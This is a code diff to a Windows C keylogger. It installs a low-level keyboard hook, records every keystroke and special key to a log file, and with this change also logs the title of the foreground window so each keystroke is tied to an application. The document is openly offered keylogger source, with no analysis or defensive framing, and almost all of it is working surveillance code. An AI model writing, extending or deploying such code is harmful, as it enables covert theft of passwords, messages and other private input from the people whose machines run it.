@@ -1,7 +1,8 @@
 #include "winkey.h"
 
-HHOOK g_Hook    = NULL;
-WCHAR BUFFER[8] = {0};
+HHOOK   g_Hook    = NULL;
+WCHAR   BUFFER[8] = {0};
+DWORD   WinTmpID  = 0;
 
 bool    Keylogger(void)
 {
@@ -29,10 +30,31 @@ LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
     lParam -> Pointer to a struct KBDLLHOOKSTRUCT
 */
 {
+
     if (code >= 0)
     {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
         {
+            HWND    FGWindow = GetForegroundWindow();
+            
+            if (FGWindow)
+            {
+                DWORD   WindowProcessID  = 0;
+                char    windowTitle[256] = {0};
+
+                GetWindowText(FGWindow, windowTitle, 256);
+                
+                GetWindowThreadProcessId(FGWindow, &WindowProcessID);
+
+                if (WindowProcessID != WinTmpID)
+                {
+                    WinTmpID = WindowProcessID;
+                    printf("\n--------[%s]--------\n", windowTitle);
+                    fprintf(LogFile, "\n--------[%s]--------\n", windowTitle);
+                }
+            }
+
+
             KBDLLHOOKSTRUCT*    kb = (KBDLLHOOKSTRUCT *)lParam;
             DWORD   VirtualKeyCode = kb->vkCode;
             
@@ -50,14 +72,13 @@ LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
             if (res == 0)
             {
                 char* specialKey = NULL;
-                
                 switch (VirtualKeyCode)
                 {
                     case VK_RETURN:    specialKey = _strdup("\n");    break;
                     case VK_BACK:      specialKey = _strdup("BACK");  break;
                     case VK_SPACE:     specialKey = _strdup(" ");     break;
                     case VK_TAB:       specialKey = _strdup("\t");    break;
-                    case VK_SHIFT:     specialKey = _strdup("SHIFT"); break;
+                    case (VK_SHIFT):     specialKey = _strdup("SHIFT"); break;
                     case VK_CONTROL:   specialKey = _strdup("CTRL");  break;
                     case VK_LCONTROL:  specialKey = _strdup("LCTRL"); break;
                     case VK_RCONTROL:  specialKey = _strdup("RCTRL"); break;
@@ -90,15 +111,15 @@ LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
                 if (specialKey != NULL)
                 {
                     printf("|%s|", specialKey);
-                    fwrite(specialKey, strlen(specialKey), 1, LogFile);
+                    fprintf(LogFile, "|%s|", specialKey);
                     free(specialKey);
                 }
             }
 
             else if (res > 0)
             {
-                printf("%ls", BUFFER);
-                fwrite((const char *)BUFFER, strlen((const char *)BUFFER), 1, LogFile);
+                printf("%s", (const char *)BUFFER);
+                fprintf(LogFile, "%s", (const char *)BUFFER);
             }
         }
     }
@@ -129,7 +150,8 @@ void    RemoveKeyHook(void)
     }
 }
 
-
+// SHIFT : 160
+// ALT   : 164
 // typedef struct tagMSG 
 // {
 //     HWND   hwnd;
